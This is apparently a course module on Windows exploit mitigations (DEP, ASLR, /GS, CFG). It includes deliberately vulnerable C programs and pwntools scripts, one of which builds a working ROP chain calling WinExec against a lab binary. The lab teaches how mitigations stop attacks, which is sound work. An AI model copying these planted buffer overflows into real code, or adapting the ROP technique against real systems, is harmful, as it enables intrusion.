## Day 1: DEP and ASLR Fundamentals

- **Goal**: Understand the two foundational exploit mitigations: DEP and ASLR.
- **Activities**:
  - _Reading_:
    - [Microsoft DEP Documentation](https://learn.microsoft.com/en-us/windows/win32/memory/data-execution-prevention)
    - [Bypassing ASLR/DEP ](https://www.exploit-db.com/docs/english/17914-bypassing-aslrdep.pdf)
    - [ASLR Implementation Details](https://blackhat.com/presentations/bh-dc-07/Whitehouse/Paper/bh-dc-07-Whitehouse-WP.pdf)
  - _Online Resources_:
    - [OffensiveCon23 - Changing and Unchanged Things in Vulnerability Research](https://www.youtube.com/watch?v=hz9HiM2eKFY)
    - [Bypass Control Flow Guard Comprehensively](https://www.youtube.com/watch?v=K929gLPwlUs)
    - [BlueHat 2018 - Windows: Hardening with Hardware](https://www.youtube.com/watch?v=8V0wcqS22vc)
    - [OffensiveCon18 - The Evolution of CFI Attacks and Defenses](https://www.youtube.com/watch?v=oOqpl-2rMTw)
    - [Battle Of The SKM And IUM: How Windows 10 Rewrites OS Architecture](https://www.youtube.com/watch?v=LqaWIn4y26E)
  - _Tool Setup_:
    - Windows 11 VM (24H2 recommended)
    - Process Explorer / Process Monitor
    - dumpbin (Visual Studio tool)
    - WinDbg Preview with Time Travel Debugging
  - _Exercise_:
    - Verify DEP blocks shellcode execution
    - Observe ASLR randomization across reboots
    - Compile programs with/without protections
    - Analyze a real CVE crash dump to identify mitigation involvement

### Deliverables

- **Lab Report**: Documented observations of DEP crashes (Exception Code 0xC0000005, Param 8)
- **ASLR Log**: Recorded addresses of `check_aslr.exe` across 3 reboots
- **Crash Analysis**: Completed mitigation identification table for the 4 test dumps
- **Analysis Report**: Completed analysis table for all 4 crash dumps
- **Screenshots**: WinDbg output showing the "Smoking Gun" for each crash
- **Write-up**: 1-paragraph explanation of how you identified each mitigation

### Lab Directory Structure

```bash
C:\Windows_Mitigations_Lab\
- src\                          # Source code for test binaries
- bin\                          # Compiled binaries
- dumps\                        # Crash dumps from WER/ProcDump
- exploits\                     # Week 5 exploits for testing
- reports\                      # Mitigation audit reports
```

### Transitioning from Linux to Windows Debugging

If you are coming from Week 5 (Linux), use this table to map your `pwndbg` commands to WinDbg:

| Description        | Pwndbg Equivalent        | WinDbg Command |
| ------------------ | ------------------------ | -------------- |
| **Crash analysis** | `bt`, `regs`, `context`  | `!analyze -v`  |
| **Memory display** | `x/b`, `x/w`, `x/g`      | `db/dd/dq`     |
| **Smart pointers** | `telescope`              | `dps`          |
| **Disassembly**    | `x/i` or `disassemble`   | `u`            |
| **Set breakpoint** | `break` or `b`           | `bp`           |
| **Hardware watch** | `watch` or `rwatch`      | `ba w`         |
| **Continue**       | `continue` or `c`        | `g`            |
| **Step over/into** | `next` / `step`          | `p` / `t`      |
| **Search memory**  | `search "string"`        | `s -a`         |
| **List modules**   | `vmmap` or `info shared` | `lm`           |
| **Heap analysis**  | `heap`, `bins`, `arena`  | `!heap`        |

> [!TIP]
> **Week 4 Callback**: For more advanced WinDbg usage, refer back to **Week 4: Crash Analysis** where we covered TTD (Time Travel Debugging) and symbol configuration in detail.

### Standardized Vulnerable Targets

To maintain continuity with previous weeks, we will use a Windows port of the vulnerable suite and the capstone server. Save these into `C:\Windows_Mitigations_Lab\src`.

**1. The Mitigation Test Suite (`vulnerable_suite_win_mitigated.c`)**

This replaces generic tests (`dep_test.c`, etc.) with a unified suite mirroring Week 4's lab.

> [!IMPORTANT]
> **Modern MSVC removed `gets()`** - it was removed in C11 as too dangerous.
> We use `fgets()` with a size mismatch instead, which MSVC recognizes as needing `/GS` protection.

```c
/*
 * vulnerable_suite_win_mitigated.c
 * Windows Port of Week 4 Vulnerable Suite
 * Compile with varying flags to test mitigations.
 *
 * NOTE: gets() was removed in modern MSVC. We use fgets() with
 * intentional size mismatch to create the same vulnerability
 * while triggering MSVC's /GS heuristics.
 */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "user32.lib")

void stack_overflow() {
    char buffer[64];

    printf("[*] Stack Overflow Target: Buffer at %p\n", buffer);
    printf("[*] Enter payload: ");
    fflush(stdout);

    // Vulnerable: fgets reads up to 256 bytes into 64-byte buffer!
    // This pattern triggers MSVC's /GS protection when compiled with /GS
    fgets(buffer, 256, stdin);
    buffer[strcspn(buffer, "\n")] = 0;  // Remove newline

    printf("[*] Received: %s\n", buffer);
}

void heap_overflow() {
    HANDLE hHeap = GetProcessHeap();
    char *chunk1 = (char*)HeapAlloc(hHeap, 0, 64);
    char *chunk2 = (char*)HeapAlloc(hHeap, 0, 64);

    printf("[*] Heap Chunks: %p, %p\n", chunk1, chunk2);
    printf("[*] Simulating linear overflow from Chunk1...\n");

    // Vulnerable: overflow into chunk2 metadata
    memset(chunk1, 'A', 128);

    printf("[*] Freeing corrupted Chunk2 (Should crash if Heap Integrity on)...\n");
    HeapFree(hHeap, 0, chunk2);
    HeapFree(hHeap, 0, chunk1);
}

void dep_trigger() {
    printf("[*] DEP Trigger: Executing data section...\n");
    // Int3 (0xCC) ; Ret (0xC3)
    unsigned char shellcode[] = { 0xCC, 0xC3 };
    void (*func)() = (void(*)())shellcode;
    func();
}

void funcptr_test() {
    void (*callback)() = dep_trigger;

    printf("[*] Function Pointer Test\n");
    printf("[*] Function pointer at: %p\n", &callback);
    printf("[*] Currently points to: %p\n", callback);
    printf("[*] Enter new function address (hex): ");
    fflush(stdout);

    unsigned long long addr;
    scanf("%llx", &addr);
    callback = (void(*)())addr;

    printf("[*] Calling function at %p...\n", callback);
    callback();  // CFG would block this if target is invalid
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <mode>\n", argv[0]);
        printf("Modes: stack, heap, dep, funcptr\n");
        return 1;
    }

    if (strcmp(argv[1], "stack") == 0) stack_overflow();
    else if (strcmp(argv[1], "heap") == 0) heap_overflow();
    else if (strcmp(argv[1], "dep") == 0) dep_trigger();
    else if (strcmp(argv[1], "funcptr") == 0) funcptr_test();

    return 0;
}
```

**2. The Capstone Server (`vuln_server_win.c`)**

A Winsock port of the Week 5 Capstone. Used to test network exploits against hardened Windows.

```c
/*
 * vuln_server_win.c - Winsock Port
 * Compile: cl vuln_server_win.c /link ws2_32.lib
 */
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

void handle_client(SOCKET client_socket) {
    char buffer[512];
    char response[] = "Welcome to SecureServer v1.0 (Windows)\n";
    send(client_socket, response, strlen(response), 0);

    // VULNERABILITY: Stack Buffer Overflow
    // recv accepts up to 1024 bytes into a 512 byte buffer
    int bytes_received = recv(client_socket, buffer, 1024, 0);

    if (bytes_received > 0) {
        printf("[*] Received %d bytes\n", bytes_received);
        buffer[bytes_received] = '\0';
        // Echo back (Format String vuln potential if printf(buffer) used)
        send(client_socket, buffer, bytes_received, 0);
    }
    closesocket(client_socket);
}

int main() {
    WSADATA wsa;
    SOCKET server_fd, client_fd;
    struct sockaddr_in server, client;
    int c;

    WSAStartup(MAKEWORD(2,2), &wsa);
    server_fd = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(8888);

    bind(server_fd, (struct sockaddr *)&server, sizeof(server));
    listen(server_fd, 3);

    printf("[*] Windows Vulnerable Server listening on port 8888...\n");

    c = sizeof(struct sockaddr_in);
    while((client_fd = accept(server_fd, (struct sockaddr *)&client, &c)) != INVALID_SOCKET) {
        printf("[*] Connection accepted\n");
        handle_client(client_fd);
    }

    closesocket(server_fd);
    WSACleanup();
    return 0;
}
```

**Per-Binary Mitigation Control**:

```bash
# RECOMMENDED: Control mitigations via compiler/linker flags per binary
# This is safer, doesn't require reboots, and mirrors enterprise practice

# Build WITHOUT mitigations (for Week 5-style testing):
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\dep_test.exe /link /NXCOMPAT:NO /DYNAMICBASE:NO /FIXED

# Build WITH mitigations (for Week 6 testing):
cl /GS /guard:cf /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\mitigated_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA /guard:cf

# Per-process mitigation control (Run in ADMIN POWERSHELL):
Set-ProcessMitigation -Name "bin\dep_test.exe" -Disable DEP,ForceRelocateImages,BottomUp
Set-ProcessMitigation -Name "bin\dep_test.exe" -Enable DEP,ForceRelocateImages,BottomUp

# NOTE: On x64 Windows, DEP is often MANDATORY for 64-bit processes
# regardless of linker flags. Use Set-ProcessMitigation to override.
```

**Compiler/Linker Flag Reference** (x64):

| Mitigation    | Enable Flag              | Disable Flag             |
| ------------- | ------------------------ | ------------------------ |
| DEP           | `/NXCOMPAT` (default)    | `/NXCOMPAT:NO`           |
| ASLR          | `/DYNAMICBASE` (default) | `/DYNAMICBASE:NO /FIXED` |
| High Entropy  | `/HIGHENTROPYVA`         | (omit flag)              |
| Stack Cookies | `/GS` (default)          | `/GS-`                   |
| CFG           | `/guard:cf`              | (omit flag)              |
| CET Compat    | `/CETCOMPAT`             | (omit flag)              |

### Graduated Mitigation Introduction

#### Step 1: DEP Only

**Setup** (Using Standardized Suite):

```bash
# PREFERRED: Use per-binary linker flags instead of system-wide changes

# Compile WITH DEP, WITHOUT ASLR (to isolate DEP testing)
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\dep_test.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED

# Verify the binary has DEP enabled:
dumpbin /headers bin\dep_test.exe | findstr "NX compatible"
# Should show: "NX compatible"
```

#### Step 2: DEP + ASLR

**Setup**:

```bash
# Compile with BOTH DEP and ASLR enabled via linker flags
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\aslr_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA

# Verify:
dumpbin /headers bin\aslr_test.exe | findstr "NX Dynamic High"
# Should show: NX compatible, Dynamic base, High Entropy Virtual Addresses
```

> [!CAUTION]
> **System DLL ASLR**
> Even if you compile your binary with `/DYNAMICBASE:NO /FIXED`, Windows 10/11 will still randomize the location of **system DLLs** like `kernel32.dll` and `kernelbase.dll` on each boot.
>
> To demonstrate the ASLR bypass working on `dep_test.exe`, you must:
>
> 1. Find the **current** addresses using WinDbg (see instructions below)
> 2. Update the address variables in your script
> 3. The exploit will work on `dep_test.exe` (binary has no ASLR)
> 4. The exploit will **fail** on `aslr_test.exe` (binary base is randomized)
> 5. After a **reboot**, even `dep_test.exe` addresses become invalid - demonstrating why ASLR matters

**Finding Gadget Addresses with WinDbg**:

```bash
# Launch WinDbg with the target
windbg C:\Windows_Mitigations_Lab\bin\dep_test.exe stack

# In WinDbg, run these commands:
0:000> g                                              # Run to the input prompt
0:000> lm                                             # List loaded modules
0:000> x KERNEL32!WinExec                             # Find WinExec address
0:000> s -b KERNELBASE <start> L<size> 59 c3          # Find 'pop rcx; ret' (59 c3)
0:000> u <address> L2                                 # Verify the gadget

# Example session:
# 0:000> x KERNEL32!WinExec
# 00007ffd`616907f0 KERNEL32!WinExec
# 0:000> s -b KERNELBASE 00007ffd`5f8d0000 L3ef000 59 c3
# 00007ffd`5f912303  59 c3 ...
# 0:000> u 00007ffd`5f912303 L2
# 00007ffd`5f912303 59       pop rcx
# 00007ffd`5f912304 c3       ret      <- Clean gadget!
```

**Test Your Week 5 ROP Exploit** (x64):

This script demonstrates a ROP chain that bypasses DEP using `WinExec`. Run it against both binaries to see ASLR's effect:

```python
#!/usr/bin/env python3
# c:\Windows_Mitigations_Lab\exploits\week5_aslr_test.py
"""
Test: Week 5 ROP/ret2lib exploit - Demonstrating ASLR's Effect

Usage:
  1. First, get current addresses from WinDbg attached to dep_test.exe:
     - x KERNEL32!WinExec
     - s -b KERNELBASE <start> L<size> 59 c3  (find 'pop rcx; ret')
  2. Update the addresses below
  3. Run against dep_test.exe  -> Should SUCCEED (calc pops)
  4. Run against aslr_test.exe -> Should FAIL (addresses randomized)
  5. Reboot and try dep_test.exe again -> Should FAIL (DLL addresses changed)
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

# Choose target binary (default: dep_test.exe for success demo)
target = sys.argv[1] if len(sys.argv) > 1 else 'dep_test.exe'
target_path = rf'C:\Windows_Mitigations_Lab\bin\{target}'

log.info(f"Target: {target}")
io = process([target_path, 'stack'])

# --- VERIFIED ADDRESSES FROM WINDBG SESSION ---
# UPDATE THESE for your system! Find them with:
#   WinDbg> x KERNEL32!WinExec
#   WinDbg> s -b KERNELBASE <start> L<size> 59 c3
#   ropper --file bin\dep_test.exe --search "ret"
winexec_addr   = 0x00007ffd616907f0  # KERNEL32!WinExec
pop_rcx_ret    = 0x00007ffd5f912303  # KERNELBASE: pop rcx; ret
ret_gadget     = 0x0000000140001078  # dep_test.exe: clean 'ret' gadget

# NOTE: ret_gadget is from the BINARY, not system DLLs!
# For dep_test.exe (no ASLR): binary always loads at 0x140000000
# For aslr_test.exe (ASLR): binary base is randomized - this gadget WON'T WORK

log.info(f"WinExec:     {hex(winexec_addr)}")
log.info(f"pop rcx;ret: {hex(pop_rcx_ret)}")

# --- LEAK STACK ADDRESS ---
io.recvuntil(b"Buffer at ")
stack_leak = int(io.recvline().strip(), 16)
log.info(f"Stack leak:  {hex(stack_leak)}")

io.recvuntil(b"Enter payload: ")

# --- BUILD PAYLOAD ---
offset_to_ret = 72
cmd_string_offset = 200  # Place "calc.exe" at a safe offset
cmd_string_addr = stack_leak + cmd_string_offset

payload = b"A" * offset_to_ret

# ROP Chain:
# 1. Align stack (needed for some functions)
payload += p64(ret_gadget)
# 2. pop rcx; ret -> RCX = &"calc.exe"
payload += p64(pop_rcx_ret)
payload += p64(cmd_string_addr)
# 3. Call WinExec("calc.exe", <whatever is in RDX>)
payload += p64(winexec_addr)

# Pad to cmd_string_offset and add the command
payload = payload.ljust(cmd_string_offset, b"X")
payload += b"calc.exe\x00"

log.info(f"Payload size: {len(payload)}")
log.info(f"cmd @ stack+{cmd_string_offset} = {hex(cmd_string_addr)}")

io.sendline(payload)

# --- CHECK RESULT ---
import time
time.sleep(2)

# Wait for process and check result
try:
    io.wait(timeout=3)
except:
    pass

if io.returncode is None:
    # Process still running - ROP chain might have worked!
    log.success("Process still alive after ROP chain")
    log.info("CHECK MANUALLY: Did calc.exe pop up?")
    log.info(f"  - If YES: Exploit succeeded against {target}")
    log.info(f"  - If NO:  ROP chain failed silently (bad addresses?)")
    io.close()
else:
    exit_code = io.returncode & 0xFFFFFFFF
    if exit_code == 0xc0000005:  # ACCESS_VIOLATION
        log.failure(f"Access Violation - exploit FAILED against {target}")
        if 'aslr' in target.lower():
            log.info("EXPECTED: ASLR randomized the binary base, ret_gadget is invalid!")
            log.info("The ROP chain used a gadget from the binary at a fixed address.")
        else:
            log.warning("Addresses may be stale. Re-run WinDbg and update them.")
    elif exit_code == 0xc0000409:  # STACK_BUFFER_OVERRUN
        log.failure(f"/GS cookie triggered - exploit FAILED against {target}")
    elif exit_code == 0:
        log.info("Process exited normally (code 0)")
        log.info("CHECK MANUALLY: Did calc.exe pop up?")
    else:
        log.info(f"Exit code: {hex(exit_code)}")
```

**Expected Results**:

```bash
# Against dep_test.exe (no ASLR) - calc.exe pops!
python exploits\week5_aslr_test.py dep_test.exe
#[*] Target: dep_test.exe
#[*] WinExec:     0x7ffd616907f0
#[*] pop rcx;ret: 0x7ffd5f912303
#[*] Stack leak:  0x14fea0          <- Low, predictable address (no ASLR)
#[+] Process still alive after ROP chain
#[*] CHECK MANUALLY: Did calc.exe pop up?
#    -> YES! calc.exe appeared - exploit succeeded!

# Against aslr_test.exe (ASLR enabled) - exploit fails!
python exploits\week5_aslr_test.py aslr_test.exe
#[*] Target: aslr_test.exe
#[*] Stack leak:  0xaf185efab0      <- High entropy, randomized!
#[*] Process exited with code: 0xc0000005
#[-] Access Violation - exploit FAILED against aslr_test.exe
#[*] EXPECTED: ASLR randomized the binary base, ret_gadget is invalid!
```

| Target          | Stack Address      | ret_gadget Valid? | Calc Pops? | Why                                               |
| --------------- | ------------------ | ----------------- | ---------- | ------------------------------------------------- |
| `dep_test.exe`  | `0x14fea0` (fixed) | Yes               | Yes        | Binary at `0x140000000`, gadget at known address  |
| `aslr_test.exe` | Random each run    | No                | No         | Binary base randomized, `0x140001078` is unmapped |

> [!IMPORTANT]
> **Why ASLR Breaks the Exploit**
> The ROP chain uses `ret_gadget = 0x140001078` which is an address **inside the binary**.
>
> - `dep_test.exe`: Always loads at `0x140000000` (ASLR disabled), gadget is valid
> - `aslr_test.exe`: Loads at random base each run, `0x140001078` points to garbage -> crash

#### Step 3: DEP + ASLR + Stack Cookies

**Setup**:

```bash
# Compile WITH /GS (stack cookies) - this is the VS default
# The /D_CRT_SECURE_NO_WARNINGS suppresses scanf deprecation warnings
cl /GS /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\gs_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA

# Check protections - /GS doesn't show in headers, but DEP+ASLR will:
dumpbin /headers bin\gs_test.exe | findstr "NX Dynamic High"
# Expected: NX compatible, Dynamic base, High Entropy Virtual Addresses

# Also compile WITHOUT /GS for comparison:
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\no_gs_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA
```

> [!NOTE]
> **Stack Cookies (/GS) Don't Appear in PE Headers**
> Unlike DEP and ASLR, stack cookie protection is purely a compiler feature.
> The cookie check code is embedded directly in function prologues/epilogues.
> You can verify /GS is active by disassembling a function with a local buffer:
>
> ```
> dumpbin /disasm bin\gs_test.exe | findstr "__security_cookie"
> ```

**Forcing /GS Protection**:

MSVC uses heuristics to decide which functions need stack cookies. Functions with `strcpy`, `fgets` with size mismatch, or similar patterns are protected. Simple `getchar()` loops may be skipped!

```bash
# The vulnerable function MUST use patterns MSVC recognizes as dangerous:
# - strcpy() to a local buffer
# - fgets() with size > buffer size
# - sprintf() without bounds

# Our vulnerable_suite uses: fgets(buffer, 256, stdin) into char buffer[64]
# This triggers /GS because 256 > 64

# Verify cookie is present by checking for the cookie load pattern:
dumpbin /disasm bin\gs_test.exe > disasm.txt
powershell -Command "Get-Content disasm.txt | Select-Object -First 50"
# Look for: mov rax,qword ptr [ADDR] ; xor rax,rsp ; mov [rsp+XX],rax
```

**Test Your Week 5 Stack Overflow**:

```python
#!/usr/bin/env python3
# c:\Windows_Mitigations_Lab\exploits\week5_gs_test.py
"""
Test: Week 5 stack overflow against DEP+ASLR+GS system
Expected: FAIL - stack cookie corrupted, process terminates before return

Usage:
  python exploits\week5_gs_test.py gs_test.exe     # With /GS - should fail with cookie check
  python exploits\week5_gs_test.py no_gs_test.exe  # Without /GS - crashes at return
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

# Choose target binary
target = sys.argv[1] if len(sys.argv) > 1 else 'gs_test.exe'
target_path = rf'C:\Windows_Mitigations_Lab\bin\{target}'

log.info(f"Target: {target}")
io = process([target_path, 'stack'])

# Wait for the prompt
io.recvuntil(b"Buffer at ")
stack_leak = int(io.recvline().strip(), 16)
log.info(f"Stack leak: {hex(stack_leak)}")

io.recvuntil(b"Enter payload: ")

# Stack layout (from disassembly of gs_test.exe):
#   sub rsp, 88h         ; 136 byte frame
#   buffer at [rsp+30h]  ; offset 48
#   cookie at [rsp+70h]  ; offset 112 (64 bytes after buffer start)
#   return at [rsp+88h]  ; offset 136 (after frame restoration)
#
# To trigger /GS: overflow past 64 bytes to corrupt the cookie at offset 64
# To trigger crash without /GS: overflow ~88 bytes to corrupt return address
#
# We send 150 bytes to ensure we corrupt both cookie AND return address

overflow_size = 150  # Enough to corrupt cookie (64+) and return address (88+)
payload = b"A" * overflow_size

log.info(f"Sending {len(payload)} bytes to overflow 64-byte buffer")
io.sendline(payload)

# Wait for process to terminate (use wait() not poll() for Windows compatibility)
try:
    io.wait(timeout=5)
except:
    pass

# Check the return code
if io.returncode is not None:
    exit_code = io.returncode & 0xFFFFFFFF
    log.info(f"Process exited with code: {hex(exit_code)}")

    if exit_code == 0xc0000409:  # STATUS_STACK_BUFFER_OVERRUN
        log.success("Stack buffer overrun detected! (/GS protection triggered)")
        log.info("Cookie was corrupted -> __security_check_cookie() called __fastfail()")
    elif exit_code == 0xc0000005:  # STATUS_ACCESS_VIOLATION
        log.warning("Access Violation - jumped to corrupted return address")
        log.info("No /GS cookie check occurred - function returned to garbage")
    elif exit_code == 0 or exit_code == 1:
        log.warning(f"Process exited normally (code {exit_code}) - no crash!")
    else:
        log.info(f"Check Windows NTSTATUS codes for {hex(exit_code)}")
else:
    log.warning("Process did not terminate within timeout")
    io.close()
```

**Expected Results**:

```bash
# Against gs_test.exe (with /GS) - cookie corruption detected!
python exploits\week5_gs_test.py gs_test.exe
#[*] Target: gs_test.exe
#[*] Stack leak: 0x30242ff940
#[*] Sending 150 bytes to overflow 64-byte buffer
#[*] Process exited with code: 0xc0000409
#[+] Stack buffer overrun detected! (/GS protection triggered)
#[*] Cookie was corrupted -> __security_check_cookie() called __fastfail()

# Against no_gs_test.exe (without /GS) - crashes at return
python exploits\week5_gs_test.py no_gs_test.exe
#[*] Target: no_gs_test.exe
#[*] Stack leak: 0x673ccffc80
#[*] Sending 150 bytes to overflow 64-byte buffer
#[*] Process exited with code: 0xc0000005
#[!] Access Violation - jumped to corrupted return address
#[*] No /GS cookie check occurred - function returned to garbage
```

| Target           | Exit Code    | Meaning                                                            |
| ---------------- | ------------ | ------------------------------------------------------------------ |
| `gs_test.exe`    | `0xc0000409` | STATUS_STACK_BUFFER_OVERRUN - /GS caught the corruption            |
| `no_gs_test.exe` | `0xc0000005` | STATUS_ACCESS_VIOLATION - crashed trying to return to `0xdeadbeef` |

**Document**: "Stack cookies detect overflow before return. Even if I bypass DEP+ASLR, the cookie check terminates the process before the corrupted return address is used."

#### Step 4: Add CFG (Day 3 Preparation)

CFG (Control Flow Guard) validates indirect call targets at runtime. We'll use the standardized suite which includes a function pointer test case.

**Setup**:

```bash
# Compile WITH CFG - all mitigations enabled
cl /GS /guard:cf /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\cfg_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA /guard:cf

# Compile WITHOUT CFG for comparison (but keep /GS to isolate CFG testing)
cl /GS /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\no_cfg_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA

# Verify CFG is enabled in the binary:
dumpbin /headers /loadconfig bin\cfg_test.exe | findstr "Guard"
# Expected: "Guard CF instrumented" and "Guard" flags in load config
```

> [!NOTE]
> **CFG Compilation Requirement**: CFG protection only applies to binaries compiled with `/guard:cf`.
> Enabling system-wide CFG (`Set-ProcessMitigation -System -Enable CFG`) does NOT protect non-CFG-compiled binaries.
> The call sites must be instrumented by the compiler to perform bitmap validation checks.

**Test Function Pointer Overwrite**:

```python
#!/usr/bin/env python3
# c:\Windows_Mitigations_Lab\exploits\week5_cfg_test.py
"""
Test: Week 5 function pointer overwrite against CFG
Expected: FAIL - CFG validates indirect call target and rejects bad address

Usage:
  python exploits\week5_cfg_test.py cfg_test.exe     # With CFG - should fail CFG check
  python exploits\week5_cfg_test.py no_cfg_test.exe  # Without CFG - crashes at call
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

# Choose target binary
target = sys.argv[1] if len(sys.argv) > 1 else 'cfg_test.exe'
target_path = rf'C:\Windows_Mitigations_Lab\bin\{target}'

log.info(f"Target: {target}")

# The vulnerable suite's 'funcptr' mode tests function pointer corruption
io = process([target_path, 'funcptr'])

# Read initial output with timeout
try:
    # Read until we see the prompt for address input
    output = io.recvuntil(b"Enter new function address", timeout=5)
    log.info("Got function pointer test output")
except:
    log.error("Timeout waiting for funcptr prompt")
    io.close()
    sys.exit(1)

# Try to redirect to an invalid address (simulating heap corruption)
# In a real exploit, this might point to shellcode or a ROP gadget
bad_target = 0xdeadbeefcafe

log.info(f"Attempting to redirect function pointer to: {hex(bad_target)}")
io.sendline(hex(bad_target).encode())

# Wait for process to handle the call and crash/exit
try:
    io.wait(timeout=5)
except:
    pass

if io.returncode is None:
    log.warning("Process still running - unexpected")
    io.close()
else:
    exit_code = io.returncode & 0xFFFFFFFF
    log.info(f"Process exited with code: {hex(exit_code)}")

    if exit_code == 0x80000003:  # STATUS_BREAKPOINT (__fastfail via int 0x29)
        log.success(f"CFG validation failed! Call to {hex(bad_target)} blocked")
        log.info("CFG checked the bitmap, rejected invalid target, called __fastfail()")
        log.info("NOTE: __fastfail raises int 0x29 -> process exit = 0x80000003")
        log.info("      WinDbg exception record still shows 0xC0000409 subcode 10")
    elif exit_code == 0xc0000409:  # STATUS_STACK_BUFFER_OVERRUN
        log.success(f"/GS cookie caught the overflow BEFORE CFG checked the call")
        log.info("/GS uses __fastfail(2) but exit code differs from CFG's __fastfail(10)")
    elif exit_code == 0xc0000005:  # STATUS_ACCESS_VIOLATION
        log.warning(f"Access Violation - call to {hex(bad_target)} attempted")
        log.info("CFG was NOT active - call went through but crashed at bad address")
    else:
        log.info(f"Check Windows NTSTATUS codes for {hex(exit_code)}")
```

**Expected Results**:

```bash
# Against cfg_test.exe (with CFG) - call blocked!
python exploits\week5_cfg_test.py cfg_test.exe
#[*] Target: cfg_test.exe
#[*] Got function pointer test output
#[*] Attempting to redirect function pointer to: 0xdeadbeefcafe
#[*] Process exited with code: 0x80000003
#[+] CFG validation failed! Call to 0xdeadbeefcafe blocked
#[*] CFG checked the bitmap, rejected invalid target, called __fastfail()
#[*] NOTE: __fastfail raises int 0x29 -> process exit = 0x80000003
#[*]       WinDbg exception record still shows 0xC0000409 subcode 10

# Against no_cfg_test.exe (without CFG) - crashes at call
python exploits\week5_cfg_test.py no_cfg_test.exe
#[*] Target: no_cfg_test.exe
#[*] Got function pointer test output
#[*] Attempting to redirect function pointer to: 0xdeadbeefcafe
#[*] Process exited with code: 0xc0000005
#[!] Access Violation - call to 0xdeadbeefcafe attempted
#[*] CFG was NOT active - call went through but crashed at bad address
```

| Target            | Exit Code    | What Happened                                                            |
| ----------------- | ------------ | ------------------------------------------------------------------------ |
| `cfg_test.exe`    | `0x80000003` | CFG intercepted the call, checked bitmap, `__fastfail(10)` -> `int 0x29` |
| `no_cfg_test.exe` | `0xc0000005` | No CFG - call executed, jumped to `0xdeadbeefcafe`, crashed              |

**Document**: "CFG validates indirect calls against a bitmap of valid targets. Even with a write primitive to corrupt function pointers, calls to arbitrary addresses are blocked."

#### Step 5: Full Mitigation Stack

| Mitigation    | Enable Via                          | Works In Any VM |
| ------------- | ----------------------------------- | --------------- |
| DEP           | `/NXCOMPAT` (linker) or system-wide | Yes             |
| ASLR          | `/DYNAMICBASE` (linker)             | Yes             |
| High Entropy  | `/HIGHENTROPYVA` (linker)           | Yes             |
| Stack Cookies | `/GS` (compiler, default)           | Yes             |
| CFG           | `/guard:cf` (compiler+linker)       | Yes             |
| XFG           | OS-level (via `/guard:cf` metadata) | Yes             |
| SEHOP         | System default (x86)                | Yes             |
| SafeSEH       | `/SAFESEH` (x86 only)               | Yes             |

**Track A Setup** (works everywhere):

```bash
# Compile a fully-protected binary (Track A mitigations) using the standardized suite
cl /GS /guard:cf /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\full_protect_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA /guard:cf

# Verify all protections:
dumpbin /headers /loadconfig bin\full_protect_test.exe | findstr "NX Dynamic High Guard"
# Expected: NX compatible, Dynamic base, High Entropy, Guard CF instrumented

# Test: all Week 5 exploits should fail against this binary
python exploits\week5_aslr_test.py full_protect_test.exe   # Fails: /GS catches overflow first!
python exploits\week5_gs_test.py full_protect_test.exe     # Fails: /GS detects cookie corruption
python exploits\week5_cfg_test.py full_protect_test.exe    # Fails: CFG blocks bad call targets
```

**Test Results:**

```bash
c:\Windows_Mitigations_Lab>python exploits\week5_aslr_test.py full_protect_test.exe
#[*] Target: full_protect_test.exe
#[*] Stack leak:  0xf2801efca0           <- ASLR randomized
#[*] Process exited with code: 0xc0000409
#[-] /GS cookie triggered - exploit FAILED

c:\Windows_Mitigations_Lab>python exploits\week5_gs_test.py full_protect_test.exe
#[*] Sending 150 bytes to overflow 64-byte buffer
#[*] Process exited with code: 0xc0000409
#[+] Stack buffer overrun detected! (/GS protection triggered)

c:\Windows_Mitigations_Lab>python exploits\week5_cfg_test.py full_protect_test.exe
#[*] Attempting to redirect function pointer to: 0xdeadbeefcafe
#[*] Process exited with code: 0x80000003
#[+] CFG validation failed! Call to 0xdeadbeefcafe blocked
```

| Exploit              | Attack Vector    | Stopped By                     | Exit Code    |
| -------------------- | ---------------- | ------------------------------ | ------------ |
| `week5_aslr_test.py` | ROP chain        | /GS (overflow corrupts cookie) | `0xc0000409` |
| `week5_gs_test.py`   | Stack overflow   | /GS (cookie check)             | `0xc0000409` |
| `week5_cfg_test.py`  | Function pointer | CFG (bitmap check)             | `0x80000003` |

> [!NOTE]
> **Defense in Depth**: The ROP exploit was stopped by /GS, not ASLR! The stack overflow
> corrupted the cookie before the corrupted return address was ever used. Multiple
> mitigations provide overlapping protection.

### Graduated Exercise Checklist

Before proceeding to Day 1's detailed content, complete these exercises:

- [ ] **Exercise G1**: DEP blocks shellcode execution
